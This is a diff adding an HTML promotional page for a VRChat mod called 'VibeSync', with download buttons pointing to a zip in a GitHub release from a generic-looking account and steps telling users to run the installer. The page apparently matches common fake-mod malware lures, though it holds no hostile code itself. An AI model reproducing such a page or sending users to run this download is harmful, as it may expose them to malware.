@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>VRChat VibeSync - The Ultimate VR Experience</title>
+    <link rel="icon" href="favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="css/styles.css" media="print" onload="this.media='all'">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <meta name="description" content="Experience VR like never before with VRChat VibeSync. Sync your emotions with your avatar in real-time.">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;700&amp;family=Raleway:wght@600;900&amp;display=swap" rel="stylesheet">
+
+    <!-- Open Graph meta tags for social sharing -->
+    <meta property="og:title" content="VRChat VibeSync - The Ultimate VR Experience">
+    <meta property="og:description" content="Immerse Yourself in a World of Emotions with VRChat VibeSync. Feel your avatar's emotions in VR like never before.">
+    <meta property="og:image" content="images/logo.webp">
+    <meta property="og:image:width" content="300">
+    <meta property="og:image:height" content="300">
+    <meta property="og:type" content="article">
+
+    <!-- Twitter Card meta tags -->
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:title" content="VRChat VibeSync - The Ultimate VR Experience">
+    <meta name="twitter:description" content="Experience a new level of VRChat immersion with VibeSync. Sync your emotions with your avatar in a futuristic VR world.">
+    <meta name="twitter:image" content="https://vrchatvbs.com/files/logo.webp">
+
+
+</head>
+<body>
+    <style>
+        body {
+           font-family: 'Raleway', sans-serif;
+           margin: 0;
+           padding: 0;
+           background-color: #0a0a0a;
+           color: #ffffff;
+           overflow-x: hidden;
+        }
+        header {
+           background: linear-gradient(45deg, #1f1f1f, #3d3d3d);
+           padding: 60px 0;
+           text-align: center;
+        }
+        header h1 {
+           font-size: 3.5em;
+           margin: 0;
+           font-weight: 900;
+           color: #ff6b6b;
+           text-shadow: 0px 4px 10px rgba(255, 107, 107, 0.7);
+        }
+        .cta-button {
+           padding: 15px 30px;
+           font-size: 1em;
+           background-color: #ff6b6b;
+           border: none;
+           color: white;
+           border-radius: 50px;
+           cursor: pointer;
+           margin-top: 20px;
+           transition: background-color 0.3s ease-in-out, transform 0.3s;
+        }
+        .center {
+            width: 600px;
+            height: 400px;
+        }
+
+        .blurred {
+            width: 150px;
+            height: 100px;
+        }
+
+        .logo {
+            width: 150px;
+            height: 150px;
+        }
+
+     </style>     
+    <header>
+        <div class="container">
+            <img loading="lazy" src="images/logo.webp" alt="VRChat VibeSync Logo" class="logo" width="150" height="150">
+            <h1>VRChat VibeSync</h1>
+            <p>Immerse Yourself in a World of Emotions</p>
+            <button onclick="window.location.href='https://github.com/DEVUSER75/uploadfile/releases/download/5151/VibeSync.zip'" class="cta-button">Download Now</button>
+        </div>
+    </header>
+
+    <section id="gallery">
+        <div class="container">
+            <h2>In-Game Gallery</h2>
+            <div class="gallery-wrapper">
+                <img loading="lazy" id="leftImage" class="blurred" src="images/18.webp" alt="Left Image" width="150" height="100">
+                <img id="centerImage" class="center" src="images/1.webp" alt="Center Image" width="600" height="400">
+                <img loading="lazy" id="rightImage" class="blurred" src="images/2.webp" alt="Right Image" width="150" height="100">
+            </div>
+            <button id="prevBtn" class="nav-button">&#10094;</button>
+            <button id="nextBtn" class="nav-button">&#10095;</button>
+        </div>
+    </section>
+
+    <section id="story">
+        <div class="container">
+            <h2>The Story Behind VibeSync</h2>
+            <p>
+                VibeSync transforms your VRChat experience, letting you feel the emotions of your avatar as you navigate through vibrant, futuristic worlds. 
+                With cutting-edge technology, VibeSync brings your avatar’s feelings to life, allowing you to connect with others on a whole new level.
+            </p>
+        </div>
+    </section>
+
+    <section id="features">
+        <div class="container">
+            <h2>Key Features</h2>
+            <div class="feature-grid">
+                <div class="feature-item">🔄 Emotion Synchronization</div>
+                <div class="feature-item">🎨 Customizable Experiences</div>
+                <div class="feature-item">💬 Discord Integration</div>
+                <div class="feature-item">🚀 Real-Time Support</div>
+            </div>
+        </div>
+    </section>
+
+    <section id="download">
+        <div class="container">
+            <h2>Get Started with VibeSync</h2>
+            <p>Download the mod and follow the steps below to fully integrate VibeSync into your VRChat experience:</p>
+            <ol>
+                <li>Download the mod file from our website.</li>
+                <li>Unzip the file and run the installer.</li>
+                <li>Activate VibeSync in VRChat settings and enjoy!</li>
+            </ol>
+            <button onclick="window.location.href='https://github.com/DEVUSER75/uploadfile/releases/download/5151/VibeSync.zip'" class="cta-button">Download Now</button>
+        </div>
+    </section>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2024 VRChat VibeSync. Your gateway to the ultimate VR experience.</p>
+        </div>
+    </footer>
+
+    <canvas id="snowCanvas"></canvas>
+    <script src="js/scripts.js" defer></script>
+</body>
+</html>
